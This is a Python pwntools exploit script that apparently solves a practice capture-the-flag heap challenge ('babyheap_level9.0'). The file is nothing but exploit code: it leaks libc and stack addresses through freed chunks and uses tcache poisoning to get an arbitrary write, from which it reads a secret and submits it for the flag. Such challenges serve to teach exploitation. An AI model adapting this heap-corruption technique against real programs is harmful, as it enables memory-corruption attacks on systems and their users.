from pwn import *

r = process('/challenge/babyheap_level9.0')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}')
    r.sendline(f'{num}')

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}')    

def edit(idx,s):
    r.sendline(b'scanf')
    r.sendline(f'{idx}')
    r.sendline(s)

def puts(idx):
    r.sendline(b'puts')
    r.sendline(f'{idx}')
    r.recvuntil(b'Data: ')

    return r.recvline().strip()



puts_offset =  0x401200
secret = 0x427140
free_hook = 0x1eeb28
environ = 0x1ef2e0
for i in range(9):
    malloc(i,0x300)

for i in range(9):
    free(i)

libc = u64(puts(7)+b'\x00\x00') - 0x1ebbe0
print(hex(libc))

malloc(0,0x200)
malloc(1,0x200)
free(0)
free(1)
#edit(1,b'a'*0x10)
edit(1,p64(libc+environ))

malloc(2,0x200)
malloc(3,0x200)

stack = u64(puts(3)+b'\x00\x00')-0x218
print(hex(stack))

malloc(0,0x30)
malloc(1,0x30)
free(0)
free(1)
edit(1,p64(stack-0x8))
malloc(2,0x30)
malloc(3,0x30)

edit(3,b'\x41'*8+p64(secret))
a = puts(0)
r.sendline(b'send_flag')
r.sendline(a)

r.interactive()